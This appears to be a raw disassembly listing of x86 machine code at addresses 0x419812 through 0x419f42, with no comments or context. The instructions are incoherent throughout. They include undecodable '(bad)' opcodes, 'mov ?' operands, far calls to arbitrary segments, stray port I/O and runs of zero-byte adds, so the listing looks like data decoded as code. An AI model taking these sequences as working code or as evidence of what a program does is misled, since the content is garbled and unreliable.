  419812:	repnz cmp eax,0xa5e441eb
  419818:	add    bh,BYTE PTR [ecx+0x73cf70be]
  41981e:	ret    0xa76e
  419821:	jae    0x4197ed
  419823:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419825:	jae    0x4197f5
  419827:	cld    
  419828:	jge    0x4197ce
  41982a:	outs   dx,DWORD PTR ds:[esi]
  41982b:	test   DWORD PTR [esi],esp
  41982d:	mov    dh,0xd
  41982f:	push   edi
  419830:	inc    DWORD PTR [eax]
  419832:	add    BYTE PTR [eax],al
  419834:	add    BYTE PTR [eax],al
  419836:	js     0x41982e
  419838:	test   esi,0xf7ba0968
  41983e:	push   DWORD PTR [ebx]
  419840:	jne    0xc59cd029
  419846:	daa    
  419847:	cmp    bl,BYTE PTR [ebx+0xd]
  41984a:	rol    BYTE PTR [esi+ebx*1],0x96
  41984e:	aam    0xb3
  419850:	cdq    
  419851:	pop    ebx
  419852:	cmc    
  419853:	xor    ecx,edi
  419855:	fimul  WORD PTR [edi-0x61]
  419858:	adc    ch,cl
  41985a:	xchg   ebx,eax
  41985b:	mov    ebp,0xd4be98a5
  419860:	xchg   ebx,eax
  419861:	sbb    edi,DWORD PTR [esi-0x6c1accce]
  419867:	mov    dl,0x1d
  419869:	pop    esi
  41986a:	in     al,0x6f
  41986c:	adc    DWORD PTR [eax],ebp
  41986e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986f:	and    eax,0x92d760cf
  419874:	bound  ecx,QWORD PTR es:[edi-0x6e]
  419878:	inc    esi
  419879:	call   0xb31d:0xea4f3b25
  419880:	shl    dh,1
  419882:	out    0x72,al
  419884:	cwde   
  419885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419886:	dec    edi
  419887:	sahf   
  419888:	cdq    
  419889:	sub    eax,0xb899aa70
  41988e:	cmp    DWORD PTR [esi+ebx*1-0x62],esi
  419892:	xchg   esp,eax
  419893:	add    DWORD PTR [esi+0x1a],eax
  419896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419897:	ja     0x4198ec
  419899:	or     eax,0x0
  41989e:	add    BYTE PTR [eax],bh
  4198a0:	push   cs
  4198a1:	psubsw mm2,QWORD PTR [ebx+0x302527d4]
  4198a8:	stos   BYTE PTR es:[edi],al
  4198a9:	cdq    
  4198aa:	test   al,0xa
  4198ac:	push   cs
  4198ad:	dec    eax
  4198ae:	not    BYTE PTR [ecx+0x2d]
  4198b1:	push   ds
  4198b2:	push   esi
  4198b3:	pop    esp
  4198b4:	cmp    edx,DWORD PTR [ebx-0x33]
  4198b7:	xlat   BYTE PTR ds:[ebx]
  4198b8:	mov    esi,0xf68ba9a5
  4198bd:	xor    al,BYTE PTR [eax]
  4198bf:	test   eax,0x82c2a367
  4198c4:	xchg   ebp,eax
  4198c5:	xchg   edi,eax
  4198c6:	fnsave [eax+0x1a]
  4198c9:	xor    ch,BYTE PTR [eax]
  4198cb:	jo     0x419917
  4198cd:	xor    ah,BYTE PTR [eax+eiz*2]
  4198d0:	jp     0x419904
  4198d2:	adc    BYTE PTR [eax-0x7e],ah
  4198d5:	xor    al,BYTE PTR [eax+0x70]
  4198d8:	sub    dh,BYTE PTR [edx]
  4198da:	dec    eax
  4198db:	xor    BYTE PTR [edx+0x32],dh
  4198de:	and    BYTE PTR [edx-0x51afcd8e],dl
  4198e4:	in     al,0x86
  4198e6:	add    ebp,DWORD PTR [ecx+0x708574b1]
  4198ec:	addr16 xchg edx,eax
  4198ee:	dec    ebx
  4198ef:	mov    eax,0x470f0eb1
  4198f4:	sub    al,0x3e
  4198f6:	mov    edx,ebp
  4198f8:	lea    esi,[edx+0xf]
  4198fb:	out    0xa9,al
  4198fd:	sbb    esi,DWORD PTR [edi-0x50e44ded]
  419903:	add    BYTE PTR [eax],al
  419905:	add    BYTE PTR [eax],al
  419907:	add    BYTE PTR [eax+0x4d2452e9],ch
  41990d:	jmp    0xfd3:0x8a212452
  419914:	push   es
  419915:	icebp  
  419916:	je     0x419951
  419918:	mov    ch,0x52
  41991a:	sub    cl,BYTE PTR [ecx-0x74c1ad53]
  419920:	icebp  
  419921:	dec    edx
  419922:	dec    esi
  419923:	pop    eax
  419924:	ds jae 0x4198fd
  419927:	mov    esi,DWORD PTR [ebp+0x52]
  41992a:	es movzx esi,cl
  41992e:	xchg   ebp,eax
  41992f:	inc    esp
  419930:	xchg   ebp,eax
  419931:	sub    dh,ch
  419933:	mov    bh,0x39
  419935:	mov    cl,0xe
  419937:	data16 mov ah,0xa8
  41993a:	sbb    eax,DWORD PTR [eax+edx*4-0x6fffedef]
  419941:	rol    BYTE PTR [ebp-0x2a1f57dd],1
  419947:	and    ebx,DWORD PTR [esp+ebx*2-0x2e778185]
  41994e:	mov    ds:0x5ca49f2f,eax
  419953:	dec    ecx
  419954:	xchg   ebx,eax
  419955:	icebp  
  419956:	push   sp
  419958:	mov    ah,0x77
  41995a:	jecxz  0x419908
  41995c:	mov    bh,0x53
  41995e:	inc    ebx
  41995f:	jl     0x4199d5
  419961:	pop    edi
  419962:	subps  xmm5,XMMWORD PTR [ebx+edi*4+0xf]
  419967:	jl     0x4199dd
  419969:	mov    ebx,0xb5e3
  41996e:	add    BYTE PTR [eax],al
  419970:	add    cl,dl
  419972:	push   ebx
  419973:	inc    ebx
  419974:	fcomp  DWORD PTR [edi+0x6a8039ec]
  41997a:	pop    ebx
  41997b:	mov    bh,bh
  41997d:	cmp    al,0x5c
  41997f:	outs   dx,BYTE PTR ds:[esi]
  419980:	mov    edi,0x80125b91
  419985:	mov    DWORD PTR [ebx-0x1d],ebx
  419988:	and    BYTE PTR [eax+0xb00125a],0xc5
  41998f:	idiv   al
  419991:	jmp    DWORD PTR [edi+eiz*2]
  419994:	inc    esi
  419995:	mov    BYTE PTR [esi],cl
  419997:	out    0xf,al
  419999:	sbb    ebx,DWORD PTR [esi+0x1a932bf6]
  41999f:	pushf  
  4199a0:	inc    esp
  4199a1:	lods   al,BYTE PTR ds:[esi]
  4199a2:	lods   eax,DWORD PTR ds:[esi]
  4199a3:	int    0xc7
  4199a5:	ret    
  4199a6:	mov    edx,0xc09c469d
  4199ab:	push   ebx
  4199ac:	add    DWORD PTR [edx-0x1d],edx
  4199af:	(bad)  
  4199b0:	and    ebx,eax
  4199b2:	iret   
  4199b3:	push   ss
  4199b4:	or     BYTE PTR [edx+0x5a],ch
  4199b7:	add    DWORD PTR [ebx+0x3f6b318],eax
  4199bd:	nop
  4199be:	aaa    
  4199bf:	xor    al,0xe8
  4199c1:	mov    edi,0xb3cfc0f1
  4199c6:	push   es
  4199c7:	or     ch,BYTE PTR [esi]
  4199c9:	xchg   ecx,eax
  4199ca:	add    al,0xe4
  4199cc:	mov    ss,WORD PTR [esi-0x36]
  4199cf:	shl    BYTE PTR [esi],1
  4199d1:	jle    0x419a49
  4199d3:	jno    0x419995
  4199d5:	add    BYTE PTR [eax],al
  4199d7:	add    BYTE PTR [eax],al
  4199d9:	add    BYTE PTR [ebx-0x4c5f8f3e],dh
  4199df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e0:	clc    
  4199e1:	lahf   
  4199e2:	mov    bl,0xca
  4199e4:	pusha  
  4199e5:	enter  0xaab3,0x10
  4199e9:	dec    ebx
  4199ea:	popf   
  4199eb:	and    edi,DWORD PTR [eax]
  4199ed:	stos   BYTE PTR es:[edi],al
  4199ee:	jle    0x4199e6
  4199f0:	sbb    esp,eax
  4199f2:	or     BYTE PTR [ebx-0x3e],bh
  4199f5:	mov    ds:0x4bb9bb5f,eax
  4199fa:	popf   
  4199fb:	and    esi,DWORD PTR ds:0x5f79dd13
  419a01:	enter  0xce73,0x5e
  419a05:	shl    BYTE PTR [ebx-0x36],1
  419a08:	outs   dx,BYTE PTR ds:[esi]
  419a09:	mov    al,ds:0xc7c0a6b3
  419a0e:	mov    bl,0xfe
  419a10:	in     al,0x8f
  419a12:	stos   DWORD PTR es:[edi],eax
  419a13:	imul   ebp,ebp,0x22
  419a16:	or     DWORD PTR [esi],eax
  419a18:	fadd   st(3),st
  419a1a:	nop
  419a1b:	push   es
  419a1c:	aam    0xcb
  419a1e:	sbb    dh,dh
  419a20:	sbb    ecx,eax
  419a22:	test   al,0x70
  419a24:	std    
  419a25:	pop    edx
  419a26:	push   eax
  419a27:	fcom   DWORD PTR [edi-0x3d]
  419a2a:	mov    ch,0xa7
  419a2c:	mov    edi,0x39bb588e
  419a31:	push   ebx
  419a32:	lea    esp,[ebx]
  419a34:	mov    edx,0xf78fd12
  419a39:	pusha  
  419a3a:	out    0x8e,eax
  419a3c:	dec    esi
  419a3d:	pusha  
  419a3e:	add    BYTE PTR [eax],al
  419a40:	add    BYTE PTR [eax],al
  419a42:	add    BYTE PTR [edi-0x71],dl
  419a45:	push   esi
  419a46:	jo     0x419a9f
  419a48:	(bad)  
  419a49:	cs loop 0x419a9b
  419a4c:	(bad)  
  419a4d:	ds out 0x1f,al
  419a50:	push   ds
  419a51:	in     eax,dx
  419a52:	mov    ?,WORD PTR [edx+0x17f6ca2f]
  419a58:	stos   BYTE PTR es:[edi],al
  419a59:	adc    cl,ch
  419a5b:	xchg   ebx,eax
  419a5c:	aam    0xcf
  419a5e:	stos   BYTE PTR es:[edi],al
  419a5f:	fwait
  419a60:	cmp    DWORD PTR [ebx-0x3b],esp
  419a63:	daa    
  419a64:	mov    ds:0x3429bcce,al
  419a69:	push   ebx
  419a6a:	add    eax,0x6412d924
  419a6f:	xlat   BYTE PTR ds:[ebx]
  419a70:	mov    ?,WORD PTR [edx-0x47]
  419a73:	or     ebp,edx
  419a75:	xchg   edi,eax
  419a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a77:	mov    bh,0xe4
  419a79:	in     eax,dx
  419a7a:	aam    0xaf
  419a7c:	les    ecx,FWORD PTR [esi-0x17]
  419a7f:	push   ds
  419a80:	out    dx,al
  419a81:	xor    al,BYTE PTR [ecx]
  419a83:	punpckhdq mm2,QWORD PTR [ebx]
  419a86:	test   BYTE PTR [eax],0xbd
  419a89:	adc    cl,ch
  419a8b:	xchg   ebx,eax
  419a8c:	ins    DWORD PTR es:[edi],dx
  419a8d:	arpl   bp,cx
  419a8f:	ja     0x419acc
  419a91:	(bad)  
  419a92:	(bad)  
  419a94:	pop    edx
  419a95:	iret   
  419a96:	rcl    DWORD PTR [ebx-0x5dd66d4e],0x2e
  419a9d:	jmp    0x21f42e8a
  419aa2:	cld    
  419aa3:	dec    edi
  419aa4:	push   ecx
  419aa5:	loope  0x419a8f
  419aa7:	add    BYTE PTR [eax],al
  419aa9:	add    BYTE PTR [eax],al
  419aab:	add    BYTE PTR [ebx-0x711f714e],dl
  419ab1:	in     eax,0x5c
  419ab3:	bound  ecx,QWORD PTR [ecx+0x18dee9ab]
  419ab9:	xchg   ecx,eax
  419aba:	in     eax,dx
  419abb:	add    BYTE PTR [esi-0x6c],dl
  419abe:	xchg   edi,eax
  419abf:	inc    esi
  419ac0:	xor    DWORD PTR [ecx],edi
  419ac2:	sbb    edx,DWORD PTR [eax]
  419ac4:	mov    dl,0x7a
  419ac6:	xor    ch,BYTE PTR [edx+edi*1]
  419ac9:	cmc    
  419aca:	xchg   ebp,eax
  419acb:	inc    esp
  419acc:	dec    ebp
  419acd:	cs daa 
  419acf:	enter  0x557a,0x97
  419ad3:	inc    esi
  419ad4:	or     eax,0x3b03ad57
  419ad9:	ds push ebx
  419adb:	and    al,0x9d
  419add:	sbb    al,0x97
  419adf:	add    al,0x1
  419ae1:	sbb    al,0x27
  419ae3:	add    esp,ebp
  419ae5:	inc    esp
  419ae6:	xchg   edi,eax
  419ae7:	inc    esp
  419ae8:	int    0x21
  419aea:	pop    ecx
  419aec:	jmp    0x419a74
  419aee:	pop    edx
  419aef:	and    al,0xd1
  419af1:	aas    
  419af2:	clc    
  419af3:	add    ecx,DWORD PTR [edi]
  419af5:	mov    edx,0x86c14697
  419afa:	mov    edi,0xf09d6d76
  419aff:	(bad)  
  419b00:	jbe    0x419a95
  419b02:	mov    ?,ecx
  419b04:	mov    ebp,0x77d991c2
  419b09:	xchg   ebx,eax
  419b0a:	jmp    0x419a97
  419b0c:	pop    esi
  419b0d:	xchg   edi,esp
  419b0f:	sldt   WORD PTR [eax]
  419b12:	add    BYTE PTR [eax],al
  419b14:	add    BYTE PTR [esi],ch
  419b16:	add    ebp,ebp
  419b18:	jmp    DWORD PTR [esi-0x1be7aac9]
  419b1e:	ret    0x8afe
  419b21:	sub    eax,0xa8033a51
  419b26:	cmp    eax,0x86012453
  419b2b:	(bad)  
  419b2c:	jae    0x419b84
  419b2e:	ss push ebp
  419b30:	adc    al,0x82
  419b32:	cmc    
  419b33:	cmpps  xmm4,xmm0,0x71
  419b37:	xor    dl,BYTE PTR [eax+edx*4-0x2c]
  419b3b:	adc    eax,0x855a8b08
  419b40:	sbb    ecx,DWORD PTR [ebx]
  419b42:	xchg   edi,eax
  419b43:	not    BYTE PTR [ebx+0x13]
  419b46:	sbb    dl,BYTE PTR [esi]
  419b48:	cmp    esp,ebx
  419b4a:	mov    bh,0xaa
  419b4c:	jno    0x419b82
  419b4e:	pop    esp
  419b4f:	test   al,0xb
  419b51:	or     ebx,DWORD PTR [ecx-0x3ebcc716]
  419b57:	pop    eax
  419b58:	out    0x1d,eax
  419b5a:	inc    ecx
  419b5b:	das    
  419b5c:	std    
  419b5d:	xchg   edi,eax
  419b5e:	add    eax,ebx
  419b60:	or     ebx,DWORD PTR ds:[edi+0x1b6913f6]
  419b67:	adc    ah,BYTE PTR [eax+edx*4]
  419b6a:	pop    ebx
  419b6b:	xchg   ebx,eax
  419b6c:	jle    0x419bc2
  419b6e:	dec    esi
  419b6f:	xchg   BYTE PTR [ebx+esi*1],al
  419b72:	push   edi
  419b73:	mov    ebx,0x13049043
  419b78:	add    DWORD PTR [eax],0x0
  419b7e:	ror    ecx,1
  419b80:	fwait
  419b81:	push   esp
  419b82:	ins    BYTE PTR es:[edi],dx
  419b83:	scas   eax,DWORD PTR es:[edi]
  419b84:	adc    ecx,eax
  419b86:	adc    ebx,DWORD PTR [ebp-0x50bb78e3]
  419b8c:	out    0x0,al
  419b8e:	ror    ebp,0xdd
  419b91:	and    edi,DWORD PTR [eax-0xd]
  419b94:	push   ss
  419b95:	or     edx,DWORD PTR [ecx-0x783f69a5]
  419b9b:	iret   
  419b9c:	mov    esi,0x9ac18ffd
  419ba1:	push   esp
  419ba2:	lods   al,BYTE PTR ds:[esi]
  419ba3:	jno    0x419b40
  419ba5:	ins    BYTE PTR es:[edi],dx
  419ba6:	mov    ah,0x75
  419ba8:	mov    eax,0xd26dcc88
  419bad:	gs push ecx
  419baf:	call   0x65fc:0x4e196619
  419bb6:	or     esi,DWORD PTR [ebx-0x2f5c17c5]
  419bbc:	mov    dh,0x44
  419bbe:	cwde   
  419bbf:	shr    BYTE PTR [esi-0x38],1
  419bc2:	jns    0x419b78
  419bc4:	push   ebp
  419bc5:	mov    edx,esp
  419bc7:	mov    ds,WORD PTR [edi]
  419bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bca:	div    BYTE PTR [edx-0x20]
  419bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bce:	push   ss
  419bcf:	out    dx,eax
  419bd0:	adc    DWORD PTR [eax],ecx
  419bd2:	scas   al,BYTE PTR es:[edi]
  419bd3:	cmp    esi,DWORD PTR [eax+ebp*8]
  419bd6:	xchg   eax,edx
  419bd8:	mov    dh,0x44
  419bda:	mov    al,dl
  419bdc:	pop    esi
  419bdd:	enter  0xb0b9,0x70
  419be1:	mov    BYTE PTR [eax],0x0
  419be4:	add    BYTE PTR [eax],al
  419be6:	add    BYTE PTR [edi+0x35],dl
  419be9:	xor    dl,BYTE PTR [eax]
  419beb:	xchg   ecx,eax
  419bec:	neg    bl
  419bee:	out    0xe,eax
  419bf0:	out    dx,eax
  419bf1:	ror    DWORD PTR [ebx],0x11
  419bf4:	jmp    0xb2bba52c
  419bf9:	sbb    bl,BYTE PTR [eax-0x18339872]
  419bff:	stos   DWORD PTR es:[edi],eax
  419c00:	cmp    esp,DWORD PTR [edi]
  419c02:	mov    bl,0x64
  419c04:	cmp    esi,DWORD PTR [esi]
  419c06:	sub    al,0xfd
  419c08:	imul   ebx,DWORD PTR [ebp+0x1f],0xffffffa9
  419c0c:	add    ebp,esp
  419c0e:	push   ebp
  419c0f:	dec    esi
  419c10:	icebp  
  419c11:	lahf   
  419c12:	xchg   edi,eax
  419c13:	inc    ecx
  419c14:	cli    
  419c15:	stos   DWORD PTR es:[edi],eax
  419c16:	jmp    0xd717:0xca3fa4f
  419c1d:	fcomi  st,st(7)
  419c1f:	scas   al,BYTE PTR es:[edi]
  419c20:	or     DWORD PTR [ebx],0xac3b8d1f
  419c26:	out    0x9f,eax
  419c28:	mov    bh,0x44
  419c2a:	inc    edx
  419c2b:	loopne 0x419c94
  419c2d:	ins    BYTE PTR es:[edi],dx
  419c2e:	out    0xc3,eax
  419c30:	addr16 fs out 0xb3,eax
  419c34:	addr16 (bad) 
  419c37:	outs   dx,DWORD PTR ds:[esi]
  419c38:	fwait
  419c39:	aas    
  419c3a:	(bad)  
  419c3b:	into   
  419c3c:	pop    edx
  419c3d:	jecxz  0x419c20
  419c3f:	jbe    0x419ca6
  419c41:	cli    
  419c42:	std    
  419c43:	sbb    bh,dh
  419c45:	xor    dh,cl
  419c47:	xchg   esi,eax
  419c48:	sbb    eax,0x39d1
  419c4d:	add    BYTE PTR [eax],al
  419c4f:	add    BYTE PTR [edi-0x6902cd22],bl
  419c55:	fidiv  WORD PTR [edx]
  419c57:	add    eax,0x532de8f
  419c5c:	fnstsw WORD PTR [ecx]
  419c5e:	ffree  st(1)
  419c60:	outs   dx,DWORD PTR ds:[esi]
  419c61:	popa   
  419c62:	out    dx,al
  419c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c64:	or     al,BYTE PTR [edx-0x3d07ca68]
  419c6a:	stc    
  419c6b:	retf   
  419c6c:	sbb    bh,dh
  419c6e:	xor    dh,cl
  419c70:	mov    ds,WORD PTR ds:0xde9719d1
  419c76:	xor    dh,BYTE PTR [ebp-0x32cd2172]
  419c7c:	xchg   dh,bl
  419c7e:	xor    bh,BYTE PTR [ebp+0x51dd3a24]
  419c84:	push   ss
  419c85:	push   esi
  419c86:	out    dx,al
  419c87:	pop    esi
  419c88:	sbb    al,BYTE PTR [edx-0x3d505268]
  419c8e:	xchg   ebx,eax
  419c8f:	cmp    ecx,DWORD PTR [esi-0x69bb8bd2]
  419c95:	gs call 0xaf95:0x9992b7a5
  419c9d:	mov    dh,0x91
  419c9f:	sub    DWORD PTR [edi+0x4aad0b1],ecx
  419ca5:	out    dx,al
  419ca6:	xor    al,ch
  419ca8:	sbb    al,0x7
  419caa:	xor    edi,ecx
  419cac:	mov    ah,0xf4
  419cae:	jmp    0x419cbe
  419cb0:	sahf   
  419cb1:	cmp    ebp,DWORD PTR [ebx+0x0]
  419cb4:	add    BYTE PTR [eax],al
  419cb6:	add    BYTE PTR [eax],al
  419cb8:	add    BYTE PTR [ebp+0x5a],al
  419cbb:	js     0x419cbf
  419cbd:	or     al,0x39
  419cbf:	fsub   st(0),st
  419cc1:	(bad)  
  419cc2:	mov    ch,0xed
  419cc4:	push   edx
  419cc6:	cli    
  419cc7:	dec    ebx
  419cc8:	pop    ebp
  419cc9:	rcr    BYTE PTR [ebx+0x24f93310],cl
  419ccf:	pop    esp
  419cd1:	mov    eax,esi
  419cd3:	adc    al,BYTE PTR [eax]
  419cd5:	jp     0x419c57
  419cd7:	(bad)  
  419cd8:	jmp    0x419cff
  419cda:	mov    eax,ds:0xbcfafef5
  419cdf:	lods   eax,DWORD PTR ds:[esi]
  419ce0:	add    DWORD PTR [ebp-0x41],esp
  419ce3:	xchg   edi,eax
  419ce4:	inc    esp
  419ce5:	xchg   ebp,eax
  419ce6:	mov    dh,0x74
  419ce8:	mov    DWORD PTR [ebx],esp
  419cea:	cmp    al,BYTE PTR [edi]
  419cec:	pop    ebx
  419ced:	cmp    edi,DWORD PTR [ebx+0x1fc7550e]
  419cf3:	js     0x419d4d
  419cf5:	xchg   ebx,eax
  419cf6:	mov    dh,0x46
  419cf8:	push   eax
  419cf9:	push   cs
  419cfa:	jle    0x419d32
  419cfc:	xor    DWORD PTR [ebp+0x72ea97ae],0xffffffc9
  419d03:	jmp    0x419d1a
  419d05:	loope  0x419d6a
  419d07:	add    BYTE PTR cs:[edx-0x42],ah
  419d0b:	xchg   ecx,eax
  419d0c:	idiv   BYTE PTR [esi-0x46fe67d3]
  419d12:	mov    cl,0x95
  419d14:	xlat   BYTE PTR ds:[ebx]
  419d16:	cmp    dl,BYTE PTR [edx+0x0]
  419d19:	(bad)  
  419d1a:	cmp    BYTE PTR [ebp+0x8],dl
  419d1d:	add    BYTE PTR [eax],al
  419d1f:	add    BYTE PTR [eax],al
  419d21:	add    BYTE PTR [esi+0xa0451fe],bh
  419d27:	test   bh,al
  419d29:	sub    ebp,0x4d
  419d2c:	add    al,BYTE PTR [eax]
  419d2e:	pop    es
  419d2f:	cmp    DWORD PTR [ebp+0xa],edx
  419d32:	jle    0x419d61
  419d34:	dec    esp
  419d35:	add    DWORD PTR [eax-0x70afeda5],edx
  419d3b:	cld    
  419d3c:	aam    0x7
  419d3e:	loopne 0x419d84
  419d40:	or     edx,DWORD PTR [ebx]
  419d42:	dec    esp
  419d43:	mov    edx,edx
  419d45:	dec    DWORD PTR [ebx+ebx*4]
  419d48:	xchg   BYTE PTR [eax],bl
  419d4a:	shl    BYTE PTR [ebx],0xfa
  419d4d:	(bad)  
  419d4e:	push   edi
  419d4f:	pop    ebx
  419d50:	or     esi,DWORD PTR [esp+esi*2+0x67]
  419d54:	popf   
  419d55:	inc    esi
  419d56:	pushf  
  419d57:	stos   DWORD PTR es:[edi],eax
  419d58:	popf   
  419d59:	push   esp
  419d5a:	je     0x419d0b
  419d5c:	xchg   edi,eax
  419d5d:	int    0x28
  419d5f:	in     al,dx
  419d60:	push   eax
  419d61:	jmp    FWORD PTR [edi]
  419d63:	adc    BYTE PTR [eax],0x31
  419d66:	push   eax
  419d67:	rcl    bl,cl
  419d69:	unpckhps xmm3,XMMWORD PTR [ebx]
  419d6c:	sbb    eax,DWORD PTR [esi+ebp*2+0x1b00125a]
  419d73:	(bad)  
  419d74:	not    BYTE PTR [ebx]
  419d76:	outs   dx,BYTE PTR ds:[esi]
  419d77:	rcl    dl,1
  419d79:	or     eax,0x13a1a76
  419d7e:	xchg   DWORD PTR [ebp+0x2b568859],esp
  419d84:	sbb    esi,DWORD PTR [ebp+0x0]
  419d8a:	add    BYTE PTR [esi+0x53],cl
  419d8d:	sbb    ebp,DWORD PTR [ebp+0xbdbd1c8]
  419d93:	ficomp WORD PTR [ecx-0x27698bf2]
  419d99:	xor    ah,bh
  419d9b:	adc    ebx,DWORD PTR [edx-0x78b178eb]
  419da1:	cwde   
  419da2:	inc    ebp
  419da3:	xchg   dh,bl
  419da5:	fistp  DWORD PTR [edi]
  419da7:	cmp    ah,BYTE PTR [ebx-0x66]
  419daa:	call   FWORD PTR [ecx]
  419dac:	adc    al,0x1c
  419dae:	mov    BYTE PTR [esi-0x46],dl
  419db1:	stos   BYTE PTR es:[edi],al
  419db2:	lds    ecx,FWORD PTR [esi-0x4e]
  419db5:	fld    DWORD PTR [ebx]
  419db7:	imul   BYTE PTR [ecx-0x3d05f24c]
  419dbd:	hlt    
  419dbe:	jbe    0x419e10
  419dc0:	cmp    esi,DWORD PTR [esi-0x9592620]
  419dc6:	xchg   esi,eax
  419dc7:	in     eax,0xb3
  419dc9:	and    al,0xc4
  419dcb:	xchg   ebp,eax
  419dcc:	int3   
  419dcd:	mov    al,ds:0x1ebee341
  419dd2:	add    edx,esp
  419dd4:	mov    dl,0xf7
  419dd6:	pop    eax
  419dd7:	xor    BYTE PTR [eax-0x10b2fc09],dh
  419ddd:	sbb    esi,eax
  419ddf:	pushf  
  419de0:	mov    dl,0xf7
  419de2:	add    ebp,DWORD PTR [ecx]
  419de4:	call   0x5cc3:0xdd701c78
  419deb:	nop
  419dec:	mov    dl,0xa4
  419dee:	add    al,0x0
  419df0:	add    BYTE PTR [eax],al
  419df2:	add    BYTE PTR [eax],al
  419df4:	(bad)  [edx+0x6b9004bc]
  419dfa:	cmp    al,0xe0
  419dfc:	mov    ds:0x9003f863,eax
  419e01:	push   edi
  419e02:	call   0xe3cff295
  419e07:	mov    es,WORD PTR [esi+ecx*4-0x35]
  419e0b:	mov    ?,WORD PTR [esi+ecx*4-0x3d]
  419e0f:	mov    WORD PTR [esi+ecx*4-0x35],cs
  419e13:	mov    BYTE PTR [esi-0x68],dl
  419e16:	pop    es
  419e17:	mov    DWORD PTR [esi],edi
  419e19:	mov    ?,WORD PTR [edi]
  419e1b:	inc    ebx
  419e1c:	into   
  419e1d:	arpl   WORD PTR [ebp-0x77],cx
  419e20:	dec    esi
  419e21:	xchg   edi,eax
  419e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e23:	mov    BYTE PTR [esi-0x74],ah
  419e26:	jo     0x419e71
  419e28:	test   al,0x29
  419e2a:	push   esi
  419e2b:	sbb    ebp,DWORD PTR [ebp-0x7c2043c9]
  419e31:	xor    eax,0xf3b7af0f
  419e36:	fwait
  419e37:	xchg   edi,eax
  419e38:	stos   DWORD PTR es:[edi],eax
  419e39:	dec    ebx
  419e3a:	mov    eax,0x9c65ab27
  419e3f:	scas   eax,DWORD PTR es:[edi]
  419e40:	jae    0x419e1b
  419e42:	(bad)  
  419e43:	mov    dl,0x45
  419e45:	hlt    
  419e46:	fwait
  419e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e48:	pop    esp
  419e49:	repz not BYTE PTR [ebx-0x11119c62]
  419e50:	ret    0x18f4
  419e53:	out    0xea,al
  419e55:	hlt    
  419e56:	sbb    bh,BYTE PTR [edx+0x0]
  419e5c:	add    bl,dl
  419e5e:	repnz xchg esi,eax
  419e60:	das    
  419e61:	pusha  
  419e62:	cmp    DWORD PTR [ebp+0x19],edx
  419e65:	adc    al,0xec
  419e67:	dec    edi
  419e68:	ins    BYTE PTR es:[edi],dx
  419e69:	int3   
  419e6a:	fist   WORD PTR [edx]
  419e6c:	sbb    cl,ah
  419e6e:	pop    ecx
  419e6f:	adc    al,0xd1
  419e71:	(bad)  
  419e72:	mov    eax,0xec14e90f
  419e77:	push   es
  419e78:	ins    BYTE PTR es:[edi],dx
  419e79:	rcr    esi,cl
  419e7b:	pop    es
  419e7c:	scas   al,BYTE PTR es:[edi]
  419e7d:	add    DWORD PTR [ebx-0x40552013],esi
  419e83:	ret    0xd3f9
  419e86:	bound  ebx,QWORD PTR ds:0xcf2fbe5f
  419e8c:	add    ecx,DWORD PTR [ebp+0x2bed552b]
  419e92:	mov    dh,0x53
  419e94:	mov    eax,ds:0x8ef77516
  419e99:	lea    esp,[ebx-0x12]
  419e9c:	gs xchg esi,eax
  419e9e:	fild   WORD PTR [eax]
  419ea0:	and    WORD PTR [ebx-0x3d7c0b13],si
  419ea7:	dec    esi
  419ea8:	jmp    0x3b3912bb
  419ead:	test   DWORD PTR [ebx-0x12],esp
  419eb0:	add    BYTE PTR [edx-0xd396840],ch
  419eb6:	daa    
  419eb7:	dec    esp
  419eb8:	pop    ebp
  419eb9:	imul   esi,DWORD PTR [edi-0x41cda9f2],0xffffffeb
  419ec0:	jbe    0x419ec2
  419ec2:	add    BYTE PTR [eax],al
  419ec4:	add    BYTE PTR [eax],al
  419ec6:	jge    0x419e85
  419ec8:	and    al,0xff
  419eca:	jl     0x419e5e
  419ecc:	(bad)  
  419ecd:	aas    
  419ece:	imul   edi,DWORD PTR [ebp+0x62861064],0xb63910de
  419ed8:	xchg   edi,eax
  419ed9:	dec    esi
  419eda:	inc    ebp
  419edb:	mov    ?,WORD PTR [ebp-0x684997f6]
  419ee1:	dec    esi
  419ee2:	inc    ecx
  419ee3:	mov    cs,WORD PTR [ebp-0x6849c7f6]
  419ee9:	dec    esi
  419eea:	ins    DWORD PTR es:[edi],dx
  419eeb:	mov    es,WORD PTR [ebp-0x6849d7f6]
  419ef1:	into   
  419ef2:	lea    ebx,[di+0x380a]
  419ef7:	mov    dh,0x5d
  419ef9:	push   ecx
  419efa:	mov    dl,BYTE PTR [ecx]
  419efc:	inc    esp
  419efd:	push   edi
  419efe:	mov    dl,0x90
  419f00:	inc    ecx
  419f01:	mov    DWORD PTR [ebp+0x52],esi
  419f04:	push   es
  419f05:	dec    DWORD PTR [edx+ebx*1]
  419f08:	add    BYTE PTR [eax-0x7],al
  419f0b:	cs (bad) 
  419f0d:	mov    esp,DWORD PTR [edx]
  419f0f:	ss hlt 
  419f11:	add    cl,ch
  419f13:	mov    edx,0x2f6a8b0e
  419f18:	rol    BYTE PTR [ecx+0xebb71b],0xe9
  419f1f:	fsubr  DWORD PTR cs:[edx-0x17]
  419f23:	hlt    
  419f24:	cld    
  419f25:	adc    BYTE PTR [eax-0x6b],bh
  419f28:	dec    BYTE PTR [edx]
  419f2a:	add    BYTE PTR [eax],al
  419f2c:	add    BYTE PTR [eax],al
  419f2e:	add    BYTE PTR [edi+0x2f],ah
  419f31:	arpl   WORD PTR [eax+edx*4],sp
  419f34:	arpl   WORD PTR [ebx],bx
  419f36:	iret   
  419f37:	sub    dl,BYTE PTR [edi-0x6b]
  419f3a:	inc    esp
  419f3b:	je     0x419f90
  419f3d:	push   ecx
  419f3e:	loop   0x419ed8
  419f40:	mov    dh,BYTE PTR [edi]
  419f42:	or     BYTE PTR [eax+0x54],al
